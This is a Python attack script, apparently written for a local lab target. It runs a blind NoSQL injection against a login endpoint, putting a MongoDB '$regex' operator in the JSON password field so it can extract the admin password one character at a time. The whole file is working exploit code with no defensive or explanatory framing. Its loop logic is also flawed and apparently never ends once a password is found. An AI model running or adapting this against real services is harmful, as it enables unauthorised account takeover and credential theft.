import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://127.0.0.1:5000/login"
headers={'content-type': 'application/json'}

run = True

while run:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if 'OK' in r.text or r.status_code == 200:
                print("Found one more char : %s" % (password+c))
                password += c
    if password == "":
        run = False
        break
print("Password is : %s" % password)